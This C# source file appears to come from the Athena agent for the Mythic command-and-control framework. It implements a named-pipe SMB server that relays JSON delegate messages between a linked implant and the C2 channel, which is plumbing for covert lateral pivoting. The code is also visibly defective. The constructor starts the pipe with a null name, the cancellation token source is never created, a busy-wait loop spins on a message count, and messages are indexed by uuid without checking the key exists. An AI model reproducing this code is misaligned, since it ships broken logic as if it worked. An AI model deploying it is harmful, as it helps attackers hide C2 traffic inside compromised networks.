using Athena.Mythic.Model.Response;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class SmbServer
    {
        public NamedPipeServerStream pipe { get; set; }
        public string namedpipe { get; set; }
        public bool Server { get; set; }
        public bool Client { get; set; }
        public CancellationTokenSource cancellationTokenSource { get; set; }

        public SmbServer()
        {
            Start(this.namedpipe);
        }

        public void Start(string name)
        {
            Task.Run(() =>
            {
                this.pipe = new NamedPipeServerStream(this.namedpipe);


                // Wait for a client to connect
                Console.Write("Waiting for client connection...");
                pipe.WaitForConnection();

                Console.WriteLine("Client connected.");
                try
                {
                    // Read user input and send that to the client process.
                    using (BinaryWriter _bw = new BinaryWriter(pipe))
                    using (BinaryReader _br = new BinaryReader(pipe))
                    {
                        while (true)
                        {
                            if (this.cancellationTokenSource.IsCancellationRequested)
                            {
                                break;
                            }


                            //Listen for Something
                            var len = _br.ReadUInt32();
                            var temp = new string(_br.ReadChars((int)len));
                            DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(temp);

                            Console.WriteLine("Received from client: {0}", temp);
                            Globals.delegateMessage.Add(dm);


                            //Wait for us to have a message to send.
                            while (Globals.outMessages.Count == 0) ;
                            //Pass to Main comms method
                            var buf = Encoding.ASCII.GetBytes(Globals.outMessages[dm.uuid]);     // Get ASCII byte array     
                            _bw.Write((uint)buf.Length);                // Write string length
                            _bw.Write(buf);                              // Write string

                        }
                    }
                }
                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
                catch (IOException e)
                {
                    Console.WriteLine("ERROR: {0}", e.Message);
                }
            },this.cancellationTokenSource.Token);
        }

        public void Stop()
        {
            this.cancellationTokenSource.Cancel();
        }
    }
}
